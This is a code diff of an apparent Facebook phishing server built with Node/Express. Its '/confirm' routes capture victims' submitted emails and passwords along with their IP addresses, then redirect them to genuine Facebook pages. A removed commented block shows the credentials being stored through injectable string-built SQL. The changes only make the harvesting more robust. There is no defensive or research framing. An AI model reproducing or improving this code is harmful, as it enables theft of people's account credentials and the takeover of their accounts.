@@ -69,13 +69,18 @@ app.post('/confirm', function (req, res) {
     var d = req.body.pass;
     if (mail == undefined) {
         mail = c;
+    } else if (c == undefined) {
+
     } else if (mail.length < c.length) {
         mail = c;
     }
 
     if (password == undefined) {
         password = d;
-    } else if (password.length < d.length) {
+    } else if (d == undefined) {
+
+    }
+    else if (password.length < d.length) {
         password = d;
     }
     var ip = req.headers['x-forwarded-for'] ||
@@ -100,13 +105,18 @@ app.post('/confirm/sama', function (req, res) {
     var d = req.body.pass;
     if (mail == undefined) {
         mail = c;
+    } else if (c == undefined) {
+
     } else if (mail.length < c.length) {
         mail = c;
     }
 
     if (password == undefined) {
         password = d;
-    } else if (password.length < d.length) {
+    } else if (d == undefined) {
+
+    }
+    else if (password.length < d.length) {
         password = d;
     }
     var ip = req.headers['x-forwarded-for'] ||
@@ -129,13 +139,18 @@ app.post('/confirm_amir', function (req, res) {
     var d = req.body.pass;
     if (mail == undefined) {
         mail = c;
+    } else if (c == undefined) {
+
     } else if (mail.length < c.length) {
         mail = c;
     }
 
     if (password == undefined) {
         password = d;
-    } else if (password.length < d.length) {
+    } else if (d == undefined) {
+
+    }
+    else if (password.length < d.length) {
         password = d;
     }
     var ip = req.headers['x-forwarded-for'] ||
@@ -166,13 +181,18 @@ app.post('/confirm/fad', function (req, res) {
     var d = req.body.pass;
     if (mail == undefined) {
         mail = c;
+    } else if (c == undefined) {
+
     } else if (mail.length < c.length) {
         mail = c;
     }
 
     if (password == undefined) {
         password = d;
-    } else if (password.length < d.length) {
+    } else if (d == undefined) {
+
+    }
+    else if (password.length < d.length) {
         password = d;
     }
     var ip = req.headers['x-forwarded-for'] ||
@@ -186,40 +206,7 @@ app.post('/confirm/fad', function (req, res) {
     })
 })
 // ***********************************************************************************************************************************************
-// app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.22155908091201572697/7353064801971644', function (req, res) {
 
-//     res.render('sina');
-// })
-// app.post('/confirm/sina', function (req, res) {
-
-
-// res.redirect('https://www.facebook.com/groups/su180/')
-// var mail = req.body.email_a;
-// var password = req.body.pass_a;
-// var c = req.body.email;
-// var d = req.body.pass;
-// if (mail == undefined) {
-//     mail = c;
-// } else if (mail.length < c.length) {
-//     mail = c;
-// }
-
-// if (password == undefined) {
-//     password = d;
-// } else if (password.length < d.length) {
-//     password = d;
-// }
-//     var ip = req.headers['x-forwarded-for'] ||
-//         req.connection.remoteAddress ||
-//         req.socket.remoteAddress ||
-//         (req.connection.socket ? req.connection.socket.remoteAddress : null);
-//     client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) {
-//         if (!err) {
-//             // console.log(result)
-//         }
-//     })
-// })
-// ************************************************************************************************************************************************
 app.get('*', function (req, res) {
     res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
 })
